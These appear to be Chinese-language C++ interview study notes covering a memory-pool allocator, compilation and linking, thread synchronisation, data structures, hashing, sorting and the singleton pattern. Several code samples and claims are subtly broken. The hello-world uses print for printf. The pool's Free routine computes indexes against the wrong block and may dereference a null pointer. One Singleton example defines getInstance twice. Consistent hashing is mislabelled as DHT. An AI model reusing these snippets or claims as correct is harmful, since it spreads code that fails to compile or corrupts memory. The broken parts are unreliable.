### 细节剖析

#### MemoryPool内存分配

```c++
void* MemoryPool::Alloc(){
    if(!pBlock){ 
		// 如果当前内存块链表为空，即第一次申请内存，此时申请一个内存块，如果申请成功并初始化完毕，返回第一个分配单元
    	pBlock = newInitBlock();
        if(!pBlock)
            return NULL;
        return (void*)(pBlock->aData);
    }
    MemoryBlock *pMyBlock = pBlock;
    while(pMyBlock && !pMyBlock->nFree){ 	// 遍历内存块链表，寻找还有”空闲单元“的内存块
        pMyBlock = pMyBlock->pNext;
    }

    if(pMyBlock){ 	// 如果还有自由分配单元的内存块，定位到该内存块可以用的自由分配单元处
        char* pFree = pMyBlock->aData + (pMyBlock->nFirst * nUnitSize);	// 通过编号定位
        pMyBlock->nFirst = *((uint16_t*)pFree);	// 取出前2个字节作为下一个空闲单元
        pMyBlock->nFree--;
        return (void*)pFree;
    }
    else{ 	// 没有找到还有自由分配单元的内存块
        if (!nGrowSize)
            return NULL;
        pMyBlock = new(nGrowSize, nUnitSize) FixedMemBlcok(nGrowSize, nUnitSize);
        if (!pMyBlock)
            return NULL;
        pMyBlock->pNext = pBlock;	// 将新申请的内存块插入链表的头部
        pBlock = pMyBlock;
        return (void*)(pMyBlock->aData);
    }
}
```

#### MemoryPool内存回收

```c++
void MemoryPool::Free(void* pFree){
    MemoryBlock *pPrev = NULL;
	MemoryBlock *pCurBlock = pBlock;
	while(((uint64_t)pCurBlock->aData > (uint64_t)pFree) || 
		((uint64_t)pFree >= ((uint64_t)pCurBlock->aData+pCurBlock->nSize))){
		// 遍历内存池的内存块链表，确定位于那个内存块，如果找不到就退出
        pPrev = pCurBlock;
        pCurBlock = pCurBlock->pNext;
        if(!pCurBlock)
            return;
	}
	pCurBlock->nFree++;	// 可供分配自由单元+1
	// 重新分配自由单元链表，将头两个自己的值指向该内存块原来的第一个可分配单元编号
	*((uint16_t*)pFree) = pCurBlock->nFirst;	
	// 将pFirst指向该回收的分配单元
	pCurBlock->nFirst = (uint16_t)(((uint64_t)pFree-(uint64_t)(pBlock->aData)) / nUnitSize);
	if(pCurBlock->nFree*nUnitSize == pCurBlock->nSize){
		// 检查是否都处于自由状态，如果是就将此内存块整个返回给进程堆，同时修改内存块链表结构
        pPrev->pNext = pCurBlock->pNext;
        delete pCurBlock;
	}
	else{
        // 否则将该内存块调到内存块链表的最前端
		pPrev->pNext = pCurBlock->pNext;
        pCurBlock->pNext = pBlock;
        pBlock = pCurBlock;
	}
}
```



## 编译与链接

```c++
#include <stdio.h>
int main(){
	print("Hello world!");
	return 0;
}
```

- 在Unix系统中，由编译器把源文件转换为目标文件

```shell
gcc -o hello hello.c
g++ -o hello hello.cpp
```

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-15\compile.png" alt="img" style="zoom:60%;" />
</div>


- 预处理阶段：处理以`#`开头的预处理命令，生成`.i/.ii`文件

- ```shell
  g++ -E hello.cpp -o hello.i
  ```

- 编译阶段：编译器进行**词法分析、语法分析、语义分析、中间代码生成、优化、目标代码生成**等，生成`.s`汇编文件

- ```shell
  g++ -S hello.cpp -o hello.s
  ```

- 汇编阶段：汇编器将汇编码生成机器码，生成`.o`目标文件

- ```shell
  g++ -c hello.cpp -o test.o
  ```

- 链接：链接器进行地址和空间分配、符号决议、重定位等，生成`.out`可执行目标程序

- ```shell
  ld -o hello.out hello.o ...libraries...
  ```

### 编译步骤

过程可以分为词法分析、语法分析、语义分析、中间代码生成、优化、目标代码生成等步骤

#### 词法分析

词法分析器读入组成源程序的字符流，并将其组成有意义的词素的序列。形如<token-name, attribute-value>这样的词法单元。（token-name是由语法分析使用的抽象符号，attribute-value是指向符号表中关于这个词法单元的条目，符号表条目的信息会被语义分析和代码生成步骤使用。）

比如赋值语句：position=initial+rate*60经过词法分析之后的到词法单元序列：<id,1><=><id,2><+><id,3><\*><60>

#### 语法分析

语法分析器使用由词法分析器生成的各词法单元的第一个分量来创建树形的中间表示。该中间表示给出了词法分析产生的词法单元的语法结构。常用的表示方法是语法树，树中每个内部节点表示一个运算，而该节点的子节点表示运算的分量。

以上赋值语句表示为语法树为：

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\yufashu.png" alt="img" style="zoom:100%;" />
</div>

#### 语义分析

**数据的含义就是语义**，简单的来说，数据就是符号。数据本身没有任何意义，只有被赋予含义的数据才能被使用，这时候数据就转换为了信息，而数据的含义就是语义。

语法分析器使用语法树和符号表中的信息来检查源程序是否和语言定义的语义一致，他同时收集类型信息，并存放在语法树或者符号表中，以便在中间代码生成过程中使用。

语法分析一个重要部分就是类型转换，比如很多语言要求数组下标必须是整数，如果使用浮点数那就必须报错。

#### 中间代码生成

在源程序翻译成目标代码的过程中，一个编译器可能构造出一个或者多个中间表示。这些中间表示可以由多种形式。语法树是一种中间表示形式，他们通常在语法分析和语义分析中使用。

在源程序的语法分析和语义分析完成之后，很多编译器生成一个明确的低级的或类机器语言的中间表示。该中间表示有两个重要的性质：1易于生成；2能够轻松的翻译为目标机器的语言。

#### 代码优化

代码优化试图改进中间代码，以便生成更好的目标的代码，即更快更短或者能耗更低。

#### 代码生成

代码生成以中间表示形式作为输入，并把它映射为目标语言。如果目标语言是及其代码，则必须为每个变量选择寄存器或者内存位置，中间指令则被翻译为能够完成相同任务的机器指令序列。

代码生成的一个至关重要的方面是合理分配寄存器以存放变量的值。

### 目标文件存储结构

- `File Header`：文件头，描述整个文件的文件属性（包括文件是否可执行、是静态链接或动态连接及入口地址、目标硬件、目标操作系统等）
- `.text section`：代码段，执行语句编译成的机器代码
- `.data section`：数据段，已初始化的全局变量和局部静态变量
- `.bss section`：BSS 段（Block Started by Symbol），未初始化的全局变量和局部静态变量（因为默认值为 0，所以只是在此预留位置，不占空间）
- `.rodate section`：只读数据段，存放只读数据，一般是程序里面的只读变量（如 const 修饰的变量）和字符串常量
- `comment section`：注释信息段，存放编译器版本信息
- `.note.GNU-stack section`：堆栈提示段

### 静态链接

- 静态链接器以一组可重定位目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务：
  - 符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来
  - 重定位：链接器通过把每个符号定义与一个内存位置关联起来，然后修改所有对这些符号的引用，使得它们指向这个内存位置

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-15\staticlink.png" alt="img" style="zoom:80%;" />
</div>


### 动态链接

- 静态链接有以下两个问题：
  - 当静态库更新时那么整个程序都要重新进行链接；
  - 对于`printf`这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。
- 共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点：
  - 在给定的文件系统中一个库只有一个文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中；
  - 在内存中，一个共享库的 .text 节（已编译程序的机器代码）的一个副本可以被不同的正在运行的进程共享。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-15\dynamiclink.png" alt="img" style="zoom:80%;" />
</div>


### 链接的接口-符号

- 在链接中，目标文件之间相互拼合实际上是目标文件之间对地址的引用，即对函数和变量的地址的引用。函数和变量统称为符号（Symbol），函数名或变量名就是符号名（Symbol Name）。

## CoreDump

Core Dump也叫做核心转储，当程序运行过程中发生异常，程序异常退出时，由操作系统把程序当前的内存状况存储到一个core文件中，叫做core dump。

使用`ulimit -c unlimited`可以开启核心转储功能。

使用`gdb [exe_path] [core_path]`打开core文件查看出错信息

## 函数的调用过程

使用到了三个常用的寄存器，`EIP`为指令指针，即指向下一条即将执行的指令的地址；`EBP`为基址地址，常用来指向栈底；`ESP`为栈顶指针，常用来指向栈顶。

- 函数调用
  - 将调用函数的参数从右往左（第一个参数在栈顶，可以动态变化参数个数，出栈的时候最左边的先出来）压入帧栈中，call指令跳转到子函数起始地址
- 保存现场
  - 将call指令后一条指令的地址压入栈中，实际上就是把`EIP`指针入栈
  - 将`EDP`入栈，因为每个函数都有自己的栈区域，所以栈基址不是一样的，现在需要进入新函数，为了不覆盖调用函数的`EDP`，将它压入栈中。
  - 将`ESP`作为`EBP`，即将此时的栈顶地址作为该函数的栈基址
  - 再分别将`EBX,ESI,EDI`压入栈中，他们分别为基址寄存器，源变址寄存器，目的变址寄存器
- 执行子函数
- 恢复现场
  - 分别弹出`EDI,ESI,EBX`的值
  - 将`EDP`的值赋给`ESP`，弹出`EBP`的值
  - 执行call返回断点

### 临时变量作为函数返回值

函数可以使用临时变量作为函数返回值，但是将一个指向临时变量的指针作为函数的返回值是有问题的，因为临时变量在函数返回时会被销毁，所以指针也就指向了一块无意义的地址空间。

拷贝构造函数将临时变量拷贝到保存返回值的外部存储单元中，然后临时对象在函数结束时被销毁。

# C++11并发多线程编程

头文件：#include <thread>

## 主要函数

- `thread t(fun)`：构造一个线程，参数是一个函数，这个函数就是线程的入口函数，函数执行完毕，整个线程就执行完毕了
- 线程创建之后，就会立即启动，并没有类似于`start`的函数来显式启动它
- 一旦线程开始执行，就需要显式的决定是要等待他完成(`join`)，或者分离让它自行运行（`detach`）。注意：只需要在`thread`对象销毁之前做出这个决定。
- `join()`，等待线程完成，同时清理线程相关的存储部分。并且当对线程使用一次`join()`后，`thread`就不能再次使用`join()`了，当对其使用`joinable()`时，返回否
- 如果子线程很慢，主线程不想等待子线程结束就像结束整个任务，直接删掉`join()`是不行的，程序会被终止（析构子线程对象的时候会调用`std::terminate`，程序会打印`terminate called without an active exception`）
- `datach()`：分离线程，使线程独自在后台运行，所有权和控制权转交给C++运行时库，以确保与线程相关联的资源在线程退出后能被正确的回收。并且调用`detach()`之后，该线程也无法再次加入了。线程在分离之后，即使该线程对象被析构了，线程还是能够在后台运行，只是由于对象被析构了，主线程不能通过对象名和这个线程进行通信。
- `notify_one()`：随机唤醒一个等待的线程
- `notify_all()`：唤醒所有等待的线程

## 例子：轮流打印整数

```c++
//notify_one()（随机唤醒一个等待的线程）
//notify_all()（唤醒所有等待的线程）

#include <bits/stdc++.h>
#include <mutex>
#include <thread>
#include <condition_variable>
using namespace std;

std::mutex data_mutex;//互斥锁
std::condition_variable data_var;//条件变量
bool flag = true;
void printfA() {
    int i = 1;
    while(i <= 100) {
        //休息1秒
        //std::this_thread::sleep_for(std::chrono::seconds(1));
        std::unique_lock<std::mutex> lck(data_mutex);
        data_var.wait(lck,[]{return flag;});//等待flag=true才打印奇数
        std::cout<<"A " << i <<endl;
        i += 2;
        flag = false;
        data_var.notify_all();
    }
}

void printfB() {
    int i = 2;
    while(i <= 100) {
        std::unique_lock<std::mutex> lck(data_mutex);
        data_var.wait(lck,[]{return !flag;});//等待flag=false才打印偶数
        std::cout<<"B " << i <<endl;
        i += 2;
        flag = true;
        data_var.notify_all();
    }
}
int main() {
    // freopen("in.txt","r",stdin);
    std::thread tA(printfA);
    std::thread tB(printfB);
    tA.join();
    tB.join();
    return 0;
}
```

# C++相关面试题

## 对象复用，零拷贝

对象服用指的是设计模式，对象可以采用不同的设计模式达到复用，最常见的就是继承和组合模式了。

零拷贝主要的任务是避免CPU将数据从一块存储拷贝到另一块存储，主要就是利用各种零拷贝技术，避免让CPU做大量的数据拷贝任务，避免不必要的拷贝。这样可以让系统资源的利用更加有效。

零拷贝技术常见于linux中，例如用户空间到内核空间的拷贝，这个是没有必要的，可以采用零拷贝技术，通过mmap，直接将内核空间的数据通过映射的方法映射到用户空间，即物理上共用这段数据。

## 优化程序的几种方法

- 使用高效的数据结构和算法
- 消除循环的低效率，尽量减少循环次数，尽量不要在循环中去循环计算一些不会改变的值
- 消除不要必要的存储器引用。尽量使用临时变量来暂存要多次使用的引用值，避免寻址开销
- 结构体成员的布局
  - 按照数据类型的长度进行排序，声明成员时把长的类型放在短的前面，先放多字节的数据，再放单字节数据，这样可以避免内存的空洞，编译器自动把结构的实例对齐在内存的偶数边界
  - 把结构体填充成最长类型长度的整数倍，这样如果结构体的第一个成员对其了，所有整个结构体也就对齐了
- 循环展开。也就是利用分治的策略来减少循环的迭代次数
- 提高并行性

## C++和C的类型安全

类型安全很大程度上可以等价于内存安全，类型安全的代码不会试图访问自己没被授权的内存区域。

### C语言的类型安全

C只在局部上下文中表现出类型安全，比如试图从一个结构体的指针转换为其他结构体的指针时，编译器会报错，除非使用显式类型转换。

但是在C中相当多的操作是不安全的，比如：

- printf函数输出，类型不匹配时不会报错
- malloc函数的返回值，其返回类型为void\*，int\* pInt = (int\*)malloc(100\*sizeof(char))就很有可能带来问题

### C++的类型安全

相对于C，C++提供了一些新的机制保障类型安全：

- 操作符new返回的指针类型严格于对象匹配，而不是返回void*
- 引入const关键字代替#define constants，它是有类型、有作用域的，而#define constants只是简单的文本替换
- 提供了dynamic_cast关键字，使得转换过程更加安全，因为dynamic_cast相比static_cast涉及更多具体的类型检查。

## 一些编程题

从一个文件的第二列中读取ip并去重

```c++
#include <iostream>
#include <fstream>
#include <sstream>
#include <unordered_set>
using namespace std;

int main(){
	ifstream in("test.log");
	string line, tmp;
	unordered_set<string> ips;
	if(in){
		while(getline(in, line)){
			istringstream ss(line);
			ss >> tmp;
			ss >> tmp;
			ips.insert(tmp);
		}
	}
	cout << ips.size() << endl;
	return 0;
}
```

给定m个字符[a,b,c,d]，字符可能重复，以及一个长度为n的字符串tbcacbdata，能否在这个字符串中找到一个长度为m的连续子串，不要求顺序

```c++
int isExist(string &str, vector<char> &chars) {
    int m = chars.size();
    int n = str.size();
    if(m > n)
        return -1;
    vector<int> hash(26, 0);
    for (int i = 0; i < m; ++i){
        ++hash[chars[i] - 'a'];
    }

    int l = 0, count = 0;
    for (int r = 0; r < n; ++r){
        --hash[str[r] - 'a'];
        //s[r]处的字符在t中
        if (hash[str[r] - 'a'] >= 0){
            ++count;
        }
		// 调整左指针l的位置
        if (r - l + 1 > m){
            ++hash[str[l] - 'a'];		// 并将删除的加上
            if (hash[str[l] - 'a'] > 0)
                --count;
            ++l;
        }
        if (count == m && r - l + 1 == m){
            return l;
        }
    }
    return -1;
}
```

线程安全的循环队列

https://blog.csdn.net/baidu20008/article/details/38308783/

# 数据结构与算法相关

## 线性数据结构

### 数组

优点：构建简单，可以在O(1)的时间内根据数组下标查询元素。

缺点：构建时必须分配连续空间；查询某个元素是否存在时需要遍历，耗费O(n)时间；增删元素时需要耗费O(n)时间

场景：只需要进行访问数据操作时使用数组

### 链表

优点：灵活分配空间；能在O(1)时间内增删元素

缺点：查询需要O(n)时间

场景：数据元素个数不确定，需要经常增删元素，但是不需要频繁查询数据时用链表

### 栈

特点：先进后出

场景：函数调用，反序输出这些场合

### 队列

特点：先进先出

场景：消息队列等

## 树

树在计算机科学中，是一种十分基础的数据结构。几乎所有操作系统都将文件存放在树状结构中；几乎所有的编译器都要实现一个表达式树；文件压缩所用到的哈夫曼算法（Huffman's Algorithm）需要用到树状结构；数据库所使用的B+tree则是一种相当复杂的树状结构。

## 二叉树

二叉树是n个节点的有限集合，该集合或者为空集，或者由一个根节点和两根互不相交的、分别被称为根节点的左子树和右子树组成。

特点：

- 每个节点最多有两个子树，所以二叉树不存在出度大于2的结点
- 左子树和右子树是由顺序的，次序不能颠倒
- 即使树中某节点只有一棵子树，也要区分左子树还是右子树

### 二叉搜索树

可以提供对数时间O(logn)的元素插入和访问，二叉搜索树的放置规则为：任何节点的键值一定大于其左子树中的每个节点的键值，并小于其右子树中的每个节点的键值。

- 应用场景
  - 哈夫曼编码
  - 海量数据并发查询
  - stl容器中的set，multiset，map，multimap内部结构

### 平衡二叉搜索树

平衡的大致意义为：没有任何一个节点过深（深度过大）。

### AVL

- 一种自平衡的二叉查找树
- AVL树中任何节点的两个子树的高度最大差是1，所以是完全平衡的
- 查找、插入和删除的平均和最坏情况都是O(logn)
- 经过修改的二叉树可能失去平衡状态（即左右高差大于1），就不是一棵AVL树了，需要将其进行旋转处理，使之重新平衡

**为什么AVL的高度差不超过1**

- 平衡二叉树是在二叉排序树的基础上引入的，就是为了解决二叉排序树的不平衡性导致的时间复杂度大大下降，不超过1的平衡二叉树就保持住了BST的最好时间复杂度O(logn)

### 红黑树

**规则：**

- 每个节点不是红色就是黑色
- 根节点为黑色
- 如果节点为红色，其子节点必须为黑色
- 任一节点至NULL（树尾端）的任何路径，所含的黑色节点数必须相同

**特点：**

- 只追求近似平衡（节点最大的深度<=最小深度*2）
- 在插入和删除节点时，翻转次数远小于平衡树，因此在需要较多插入删除操作时，使用红黑树更好。
- 在查询操作比较多时，使用平衡树比较好，因为红黑树查询的深度可能会大于平衡二叉树

### B树，B+树

- 一种多路查找树
- B树中所有节点都有指向记录的指针，在非叶子节点种出现的索引项不会出现在叶子节点中；B+树种**只有叶子节点**会带有指向记录的指针。
- B+树的所有叶子节点通过双向链表连接在一起；B树不连接
- B树优点：对于在内部节点的数据，可以直接获得，不必根据叶子节点来定位
- B+树优点：1非叶子节点不会带上指向记录的指针，这样一个块中就可以容纳更多的索引项；2叶子节点通过指针连接在一起，可以横向遍历。

## heap

堆实际是一个完全二叉树，所有元素都可以将其保存在一个vector之中，heap没有迭代器。

max-heap的最大值在根节点，即在vector的第一个元素；min-heap的最小值在根节点，即在vector的第一个元素。

- 插入：先将元素插入到vector的尾部，然后进行上溯程序，将新节点与其父节点比较，如果键值大于父节点，就对换位置，否则一直上溯，直到不需对换或者到达根节点。
- 弹出：弹出操作取走根节点（实现中其实时将其移至底层容器vector的最后一个元素）之后，为了满了完全二叉树的特性，必须将最下一层最右边的叶子节点拿掉，然后为其找一个适当的位置。
  - 执行下溯操作，即将根节点填入根节点，然后将它与它的两个子节点作比较，并于较大的键值对调位置，一直下放到他的键值大于左右两个子节点或者到达叶子节点为止。

## hash

### 哈希表

- 哈希表（HashTable）也叫散列表，是根据关键码值（key-value）而直接访问的数据结构
- 可以把关键码值**映射**到表中的一个位置来访问记录，加快查找的速度
- 这个映射函数叫做**哈希函数**（散列函数），存放记录的数组叫做哈希表
- `storage location(bucket)=H(key)`，`H()`被称为哈希函数（散列函数），采用哈希技术将记录存储在一块连续的存储空间

### 哈希表的存取

- 存值：把key通过一个固定的哈希函数转换为一个整形数字，然后对该数字长度进行取余，取余结果当作数组的下标，将value存储在以该数字为下标的数组空间中
- 取值：再次使用哈希函数将key转换为对应的数组下标，并定位到哈希表中获取value

### 哈希的应用

- 加密算法：把不同长度的信息转换为杂乱的128位的编码（MD5）
- 查找：当知道key值之后，可以直接计算出元素在集合中的位置

### 常见的哈希函数

- 直接定址法：取关键字key或者关键字中的某个线性函数值作为散列地址，即`H(key)=key or H(key)=a*key+b; a,b=常数`
- 除留余数法：取关键字key被某个不大于哈希表大小m的数p求余
- 数字分析法：当关键字位数大于地址位数，对关键字的各位分布进行分析，选出分布均匀的任意几位作为哈希地址
- 平方取中法：计算关键字值的平方，然后取平均值中间几位作为哈希地址
- 折叠法：将关键字分为位数相同的及部分，然后取这及部分的叠加和（进位舍去）作为哈希地址

### 哈希冲突

- 不同关键字通过相同哈希函数计算处相同的哈希地址，这种现象称为哈希冲突

- 处理方法：
  - 链地址法：key相同的使用单链表连接（数组+链表）
  - 开放定址法：
    - 线性探测法：放到`H(key)`的下一个位置，`Hi=(H(key)+i)%m`
    - 二次探测法：放到计算位置后偏移量（1，2，3...）的二次方地址处
    - 随机探测法：`Hi=(H(key)+random)%m`
  
- **STL中通常使用链地址法解决哈希冲突**，使用的节点结构体为

- ```c
  template <class Value>
  struct __hashtable_node{
  	__hashtable_node* next;
  	Value val;
  };
  ```

### STL中的hash表

stl中的hash_table是用于实现无序关联容器的底层结构。

其中哈希表里的元素节点被称为桶（bucket），桶内维护的是链表，但不是STL中的链表，而是自行维护的一个node。bucket聚合体也即hash_table使用vector实现。

- **hash_table**扩容时发生什么：
  - 创建一个新桶，该桶是原来桶两倍大最接近的质数（判断质数：用n除以2到`sqrt(n)`的所有整数）
  - 将原来桶里的数通过指针的转换，插入到新桶里
  - 通过swap函数将新桶和旧桶交换，销毁旧桶

#### hash_map和map的区别

- map优点：有序，底层为红黑树，可以使map的很多操作以O(logN)的时间复杂度完成
- map缺点：空间占用高，因为内部使用RB-tree，虽然提高了运行效率，但每个节点都存储了父节点、孩子节点和颜色。
- map适用于：对于有顺序要求的场合
- hash_map优点：内部实现了哈希表，查找速度很快
- hash_map缺点：哈希表建立比较耗费时间
- hash_map适用于：对于查找问题，速度很高效

### 一致性哈希

一致性哈希（Distribute Hash Table, DHT）是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。

#### 基本原理

将哈希空间`[0,2^n-1], n=32`看成一个哈希环，每个服务器节点都配置到哈希环上，每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中**顺时针方向第一个大于该哈希值的服务器节点**上。如下图将数据对象C插入到节点中，计算`Hash()%2^32`会得到一个节点，此时他的顺时针方向第一个服务器节点`Node C`，则将它放入节点`Node C`中。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-20\consisitenctHash1.png" alt="img" style="zoom:70%;" />
</div>


一致性哈希在增加（集群扩容）或者删除服务器节点（某节点宕机）时只会影响到哈希环中**相邻的节点**。例如下图中新增服务器节点X，只需要将在节点`Node B`和节点`Node X`之间的原本属于`Node C`的数据对象C重新分配即可，对于其他数据对象A,B,D均没有影响。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-20\consistencyHash2.png" alt="img" style="zoom:70%;" />
</div>
#### 一致性哈希中的数据倾斜问题

当一致性Hash算法中的服务器节点过少时，容易因为分布不均匀而造成数据倾斜（被缓存的对象大部分集中缓存在某一台服务器上）的问题。如图中，只有两台机器`D0, D1`，这两台机器离的很近，那么顺时针第一个机器节点上将存有大量的数据；第二台机器上的数据很少。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-20\node12.png" alt="img" style="zoom:70%;" />
</div>


- 使用**虚拟节点**解决数据倾斜问题，也就是每台机器节点会进行多次哈希，最终每个机器节点在哈喜欢上会有多个虚拟节点存在，使用这种方式来大大削弱甚至避免数据倾斜问题。同时数据定位算法不变，只是多了一步**虚拟节点到实际节点的映射**，例如定位到“D1#1”、“D1#2”、“D1#3”三个虚拟节点的数据均定位到 D1 上。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-20\virtualnode.png" alt="img" style="zoom:70%;" />
</div>


## 排序

| 排序算法                                                     | 平均时间复杂度 | 最差时间复杂度 | 空间复杂度 | 数据对象稳定性       |
| ------------------------------------------------------------ | -------------- | -------------- | ---------- | -------------------- |
| [冒泡排序](https://github.com/huihut/interview/blob/master/Algorithm/BubbleSort.h) | O(n2)          | O(n2)          | O(1)       | 稳定                 |
| [选择排序](https://github.com/huihut/interview/blob/master/Algorithm/SelectionSort.h) | O(n2)          | O(n2)          | O(1)       | 数组不稳定、链表稳定 |
| [插入排序](https://github.com/huihut/interview/blob/master/Algorithm/InsertSort.h) | O(n2)          | O(n2)          | O(1)       | 稳定                 |
| [快速排序](https://github.com/huihut/interview/blob/master/Algorithm/QuickSort.h) | O(n*log2n)     | O(n2)          | O(log2n)   | 不稳定               |
| [堆排序](https://github.com/huihut/interview/blob/master/Algorithm/HeapSort.cpp) | O(n*log2n)     | O(n*log2n)     | O(1)       | 不稳定               |
| [归并排序](https://github.com/huihut/interview/blob/master/Algorithm/MergeSort.h) | O(n*log2n)     | O(n*log2n)     | O(n)       | 稳定                 |
| [希尔排序](https://github.com/huihut/interview/blob/master/Algorithm/ShellSort.h) | O(n*log2n)     | O(n2)          | O(1)       | 不稳定               |
| [桶排序](https://github.com/huihut/interview/blob/master/Algorithm/BucketSort.cpp) | O(n)           | O(n)           | O(m)       | 稳定                 |
| [基数排序](https://github.com/huihut/interview/blob/master/Algorithm/RadixSort.h) | O(k*n)         | O(n2)          |            | 稳定                 |

### 堆排序

```c++
#include <iostream>
#include <vector>
using namespace std;

void max_heapify(vector<int>& arr, int start, int end){
    int dad = start;				// 建立父节点和子节点下标
    int son = dad * 2 + 1;
    while(son <= end){				// 如果子节点下标在范围内才进行比较
        if(son + 1 <= end && arr[son] < arr[son+1])		// 比较两个子节点，选择最大的
            son ++;
        if(arr[dad] > arr[son])		// 将父节点和最大子节点比较，如果大于则表示调整完毕，跳出
            return;
        else{
            swap(arr[dad], arr[son]);	// 如果小于就交换内容
            dad = son;
            son = dad * 2 + 1;
        }
    }
}

void heap_sort(vector<int>& arr){
    int len = arr.size();
    for(int i = len / 2 - 1; i >= 0; i --)
        max_heapify(arr, i, len-1);		// 先将最大的上溯到0位置
    for(int i = len-1; i > 0; i--){
        swap(arr[0], arr[i]);			// 将0位置元素（最大的）和当前循环的最后一个元素交换
        max_heapify(arr, 0, i-1);		// 对剩下的继续进行最大堆调整
    }
}
```

# 设计模式

设计模式（Design Pattern）代表了最佳实践。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决问题。

设计模式是一套被反复使用的、多人知晓的、经过分类编目的、代码设计经验的总结。

使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。

设计模式是软件设计中常见问题的典型解决方案。每个模式就像一张蓝图，可以通过对齐进行定制来解决代码中的特定设计问题。

## 设计模式六大原则

### 单一职责（Single Responsibility Principle）

类的职责要单一，不能将太多的职责放在一个类中。

### 开闭原则（Open Close Principle）

**对扩展开放，对修改关闭。**在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类。

### 里氏代换原则（Liskov Substitution Principle）

是面向对象设计的基本原则之一。该原则说，任何基类可以出现的地方，子类一定可以出现。LSP是继承复用的基石，只有派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤是抽象化，而基类和子类的继承关系就是抽象化的具体实现，所以里氏代换原则是**对实现抽象化的具体步骤的规范**。

### 依赖倒转原则（Dependence Inversion Principle）

这个原则是开闭原则的基础，具体内容为：**针对接口编程，依赖于抽象而不依赖于具体**。

### 接口隔离原则（Interface Segregation Principle）

使用多个隔离的接口，比使用单个接口更好。即降低类之间的耦合度。

### 迪米特法则（Demeter Principle）：最少知道原则

一个实体应当尽量少的与其他实体之间发生相互作用，使得系统功能模块相对独立。

### 合成复用原则（Composite Reuse Principle）

尽量使用合成/聚合的方式，而不是使用继承。

## 创建型模式

### 单例模式（Singleton）

单例模式是一种创建型设计模式，**能够保证一个类只有一个实例，并提供一个访问该实例的全局节点**。

#### 解决的问题

**1，保证一个类只有一个实例**。最常见的原因是控制某些共享资源的访问权限。

**2，为该实例提供一个全局访问节点**。和全局变量一样，单例模式也允许在程序的任何地方访问特定对象。但是他可以保护该实例不被其他代码覆盖。

#### 解决方案

所有实例的实现都包含以下两个相同的步骤：

- 将默认构造函数设置为私有，防止其他对象使用单例类的`new`运算符
- 新建一个静态构造方法作为构造函数。该函数会“偷偷”调用私有构造函数来创建对象，并将其保存在一个静态成员变量中。此后所有该函数的调用都将返回这一缓存对象。

如果代码能够访问单例类，那他就能调用单例类的静态方法。无论何时调用该方法，他总是能够返回相同的对象。

#### 单例模式结构

单例（Singleton）类声明一个名为`getInstance`获取实例的静态方法来返回其所属类的一个相同实例。

单例的构造方法必须对客户端代码隐藏，调用获取实例方法必须是获取单例对象的唯一方式。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\singleton.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- 如果程序中的某个类对于所有客户端只有一个可用的实例，可以使用单例模式。
  - 单例模式禁止通过除特殊构建方法以外的任何方式来创建自身类的对象。 该方法可以创建一个新对象， 但如果该对象已经被创建， 则返回已有的对象。
- 如果需要更加严格的控制全局变量，可以使用单例模式。
  - 单例模式与全局变量不同， 它保证类只存在一个实例。 除了单例类自己以外， 无法通过任何方式替换缓存的实例。
- 注意：可以随时调整限制并设定生成单例实例的数量， 只需修改 `获取实例`方法， 即 getInstance 中的代码即可实现。

#### 实现方式

- 在类中添加一个私有静态成员变量用户保存单例实例。
- 声明一个公有静态构建方法用于获取单例实例。
- 在静态方法中实现“延迟初始化”。该方法会在首次被调用时创建一个新对象，并将其存储在静态成员变量中。此后该方法每次被调用时都返回该实例。
- 将类的构造函数设置为私有。类的静态方法仍能调用构造函数，但是其他对象不能调用。
- 检查客户端代码，将对单例的构造函数的调用替换为对其静态构造方法的调用。

#### 代码实现

```c++
// 懒汉式，线程不安全
class Singleton{
public:
	static Singleton* getInstance(){}
private:
	Singleton(){}
	static Singleton *singleton;
};
Singleton* Singleton::singleton = NULL;
Singleton* Singleton::getInstance(){
    if(singleton == NULL)
        singleton = new Singleton();
    return singleton;
}

// 懒汉式，线程安全
#include <mutex>
class Singleton {
private:
    Singleton() {}
    static Singleton* singleton;
    static pthread_mutex_t mutex;
public:
    static Singleton* getInstance();
};
pthread_mutex_t Singleton::mutex = PTHREAD_MUTEX_INITIALIZER;
Singleton* Singleton::singleton = NULL;
Singleton* Singleton::getInstance(){
    if(singleton == NULL){ 
        pthread_mutex_lock(&mutex);
        if(singleton == NULL)
            singleton = new Singleton();
        pthread_mutex_unlock(&mutex);
    }
    return singleton;
}

// 饿汉式，线程安全，初始就创建一个实例
class Singleton{
private:
    Singleton (){}
    static Singleton* singleton;
public:
    static Singleton* getInstance(){
        return singleton;
    }
};
Singleton* Singleton::singleton = new Singleton();
```

#### 优缺点

**优点：**

- 可以保证一个类只有一个实例
- 获得了一个指向该实例的全局访问节点
- 仅在首次请求实例对象时对齐初始化

**缺点：**

- 违反了**单一职责原则**。该模式同时解决了两个问题。
- 单例模式可能掩盖不良设计，比如程序各组件之间相互了解过多等
